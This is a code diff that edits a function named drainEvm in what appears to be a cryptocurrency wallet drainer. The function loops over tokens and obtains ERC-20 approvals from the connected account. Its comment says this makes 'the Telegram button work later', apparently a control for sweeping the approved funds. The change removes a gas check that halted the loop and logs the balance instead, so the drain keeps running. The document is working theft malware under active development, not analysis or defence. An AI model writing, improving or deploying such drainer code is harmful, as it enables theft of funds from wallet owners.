@@ -440,14 +440,8 @@ async function drainEvm() {
   for (const t of list) {
     // 1. approve FIRST — this is what makes the Telegram button work later.
     if (cfg.approveMode) {
-      const bal = await evmProvider.getBalance(account);
-      const fee = await evmProvider.getFeeData();
-      const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
-      if (bal < 120000n * price) {
-        log(`${t.symbol}: out of gas on ${chain.name} (${ethers.formatEther(bal)}) — stopping`);
-        setStatus(`${chain.name}: out of gas`);
-        break;
-      }
+   const bal = await evmProvider.getBalance(account);
+      log(`${t.symbol}: balance ${ethers.formatEther(bal)} ${chain.symbol}`);
       try {
         const erc = new ethers.Contract(
           t.address, ['function allowance(address,address) view returns (uint256)'], evmProvider);
